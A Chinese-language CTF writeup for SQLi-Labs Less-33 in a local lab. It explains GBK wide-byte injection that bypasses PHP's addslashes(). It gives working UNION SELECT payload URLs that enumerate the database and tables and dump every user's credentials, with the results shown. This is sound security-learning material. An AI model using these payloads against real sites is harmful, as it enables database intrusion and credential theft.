【SQLi-Labs】Less-33 宽字节注入与 addslashes 绕过 Writeup

操作者：何芊宏 | 操作日期：2026.10.27 | 分类：CTF | 标签：SQLi-Labs, Web, SQL注入, 宽字节注入, addslashes

1. 题目信息

  • 平台：SQLi-Labs (本地 phpStudy 环境)
  • 分类：Web - SQL注入
  • 题目名称：Less-33 (GET - Bypass addslashes)
  • 提示：页面回显转义结果及十六进制编码。单引号被转义，需使用宽字节绕过。

2. 核心原理：GBK 宽字节注入

本关卡与 Less-32 的核心机制完全相同。区别仅在于后端转义函数从自定义的 check_addslashes() 换成了 PHP 内置的 addslashes()。

  • 防御机制：addslashes() 会在单引号 '（0x27）前加上反斜杠 \（0x5C）。
  • 绕过机制：由于数据库使用 GBK 编码，输入 %df'（0xDF 0x27）被转义后变为 0xDF 0x5C 0x27。0xDF 和 0x5C 被解析为一个双字节汉字，单引号 0x27 成功逃逸。

3. 操作步骤与解析

第一步：验证转义与字节拼接

输入 URL：?id=1%df'

回显现象：底部提示 Hex becomes : 31 df 5c 27。df 与 5c 紧密相连，证明宽字节条件已满足。

第二步：爆库名

输入 URL：?id=-1%df' union select 1,2,database()-- -

回显现象：页面第 2 列回显 security。

第三步：爆表名

输入 URL：?id=-1%df' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()-- -

回显现象：页面回显 emails,referrers,uagents,users。

第四步：脱库获取账号密码

输入 URL：?id=-1%df' union select 1,2,group_concat(username,0x3a,password) from users-- -

回显现象：页面直接爆出所有用户的账号和密码（如 Dumb:Dumb、admin:p@ssw0rd 等）。

4. 踩坑记录与复盘

  • 编码陷阱：%df 必须直接发送原始字节。如果在 Burp 或其他工具中使用了 URL 编码功能，% 被二次编码为 %25，宽字节注入将直接失效。
  • 闭合与注释：闭合符为单引号，注释符使用 -- -（URL 中写为 --%20-）。

5. 知识点总结

  • 宽字节注入：利用字符集（GBK）的双字节特性，通过构造高位字节吞掉转义符 \，使引号逃逸。
  • 不同防御函数的同源性：理解 addslashes 等转义函数的底层原理，以及它们在非 UTF-8 字符集下的共有缺陷。
